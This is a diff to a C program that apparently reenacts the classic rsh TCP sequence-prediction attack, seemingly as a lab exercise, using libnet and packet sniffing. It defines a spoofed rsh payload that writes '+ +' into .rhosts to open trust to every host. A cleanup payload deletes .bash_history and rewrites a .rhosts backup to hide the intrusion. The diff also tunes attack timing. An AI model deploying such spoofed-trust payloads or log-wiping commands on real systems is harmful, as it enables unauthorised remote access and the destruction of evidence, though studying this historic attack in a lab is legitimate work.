@@ -17,8 +17,8 @@
 #define DSTPORT 514
 #define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts"
 #define EXPLOITLEN 44
-#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; sed -i '$ d' .rhosts.back"
-#define CLEANLEN 63
+#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; echo -e 'server tsutomu\n' > .rhosts.back"
+#define CLEANLEN 78
 
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 
@@ -81,7 +81,7 @@ int main(int argc, char **argv)
     libnet_clear_packet(l);
     //Create the pscket sniffer
     pcap_t *des=packetSnifferInitialize();
-
+    sleep(2);
     uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
     libnet_clear_packet(l);
     printf("\nNext: %u",next);
@@ -98,7 +98,7 @@ int main(int argc, char **argv)
         sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
     }
     
-    usleep(1000);
+    
     libnet_clear_packet(l);
     //RESTORE THE SERVER*/
     printf("\n Enabling the server...");
